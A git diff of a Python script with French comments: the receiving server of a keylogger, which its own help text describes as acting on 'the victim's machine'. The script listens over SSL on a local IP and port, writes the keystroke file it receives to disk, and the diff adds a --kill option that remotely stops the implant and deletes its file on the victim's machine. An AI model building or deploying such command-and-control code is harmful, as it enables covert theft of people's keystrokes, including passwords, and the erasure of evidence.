@@ -1,4 +1,22 @@
-import socket, ssl
+import socket, ssl, argparse
+
+#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# FONCTIONS
+#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# OPTIONS
+#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Créer une aide pour -h
+parser = argparse.ArgumentParser(description="Voici les options à utiliser avec le keylogger :")
+# Arrêter le programme et supprimer le fichier si l'option -k est utilisée
+parser.add_argument("-k", "--kill", help="Pour arrêter le programme et supprimer le fichier sur le poste de la victime, ajoutez l'option -k ou --kill", action="store_true")
+args = parser.parse_args()
+
+#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# CODE PRINCIPAL 
+#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Paramètres du serveur
 server_address = ("192.168.1.66", 8080)
@@ -27,20 +45,25 @@ client_ssl = server_ssl.wrap_socket(
     server_side=True,
 )
 
-# Nom du fichier à recevoir
-file_name = "reçu.txt"
+if args.kill:
+    # Arrêter le programme et supprimer le fichier
+    client_ssl.send(b"kill")
+    print("Le programme a été arrêté et le fichier supprimé !")
+else:
+    # Nom du fichier à recevoir
+    file_name = "reçu.txt"
 
-# Ouvrir le fichier en mode écriture binaire
-with open(file_name, "wb") as f:
-    # Lire les données reçues du client
-    data = client_ssl.recv(1024)
-    while data:
-        # Ecrire les données dans le fichier
-        f.write(data)
+    # Ouvrir le fichier en mode écriture binaire
+    with open(file_name, "wb") as f:
         # Lire les données reçues du client
         data = client_ssl.recv(1024)
+        while data:
+            # Ecrire les données dans le fichier
+            f.write(data)
+            # Lire les données reçues du client
+            data = client_ssl.recv(1024)
 
-print("Fichier reçu !")
+    print("Fichier reçu !")
 
 # Fermer ssl
 client_ssl.close()
